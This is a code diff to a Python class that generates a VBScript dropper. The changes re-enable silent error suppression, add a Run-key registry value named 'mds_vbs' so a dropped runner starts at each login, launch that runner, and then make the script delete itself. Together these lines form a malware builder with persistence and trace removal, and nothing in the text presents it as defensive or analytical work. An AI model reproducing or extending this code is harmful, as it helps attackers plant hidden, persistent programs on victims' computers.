@@ -1,4 +1,3 @@
-
 class Extracter:
 	var = []
 	whole_code = ""
@@ -13,7 +12,7 @@ class Extracter:
 		self.core = core
 
 	def get_starter_lines(self):
-		# self.vbs_code.append('On Error Resume Next')
+		self.vbs_code.append('On Error Resume Next')
 		self.vbs_code.append('runner = \"%s\"'%(self.runner))
 		self.vbs_code.append('core = \"%s\"'%(self.core))
 		self.vbs_code.append('Set fso = CreateObject(\"Scripting.FileSystemObject\")')
@@ -27,11 +26,9 @@ class Extracter:
 		self.vbs_code.append('strComputer = "."')
 		self.vbs_code.append('Set oReg = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\default:StdRegProv\")')
 		self.vbs_code.append('val_name = \"mds_vbs\" : key_path = \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"')
-		self.vbs_code.append('oReg.SetExpandedStringValue HCU, key_path, val_name, app_path & \"\"')
-
-
-
-
+		self.vbs_code.append('oReg.SetExpandedStringValue HCU, key_path, val_name, app_path & \"%s\"'%(self.runner_name))
+		self.vbs_code.append('oShell.Run app_path & \"%s\"'%(self.runner_name))
+		self.vbs_code.append('fso.DeleteFile WScript.ScriptFullName')
 
 	def get_whole_code(self):
 		for line in self.vbs_code:
@@ -42,8 +39,6 @@ class Extracter:
 			fw.write(self.whole_code)
 		print(self.whole_code)
 
-
-# help functions
 
 def get_payload(payload_name):
 	with open(payload_name) as fr:
